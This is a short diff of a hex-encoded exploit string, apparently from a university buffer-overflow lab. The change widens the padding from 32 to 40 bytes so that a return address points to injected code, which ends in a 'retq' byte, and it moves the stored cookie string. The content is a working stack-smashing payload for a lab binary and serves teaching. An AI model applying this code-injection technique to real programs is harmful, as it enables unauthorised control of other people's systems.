@@ -3,7 +3,7 @@
 c3                   	    /* retq                           */
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00                    /* totally 32 bytes above         */
-35 39 62 39 39 37 66 61     /* store cookie                   */
+00 00 00 00 00 00 00 00
+00 00 00                    /* totally 40 bytes above         */
 78 dc 61 55 00 00 00 00     /* start address of injected code */
 35 39 62 39 39 37 66 61 00  /* store cookie: 59b997fa\0       */
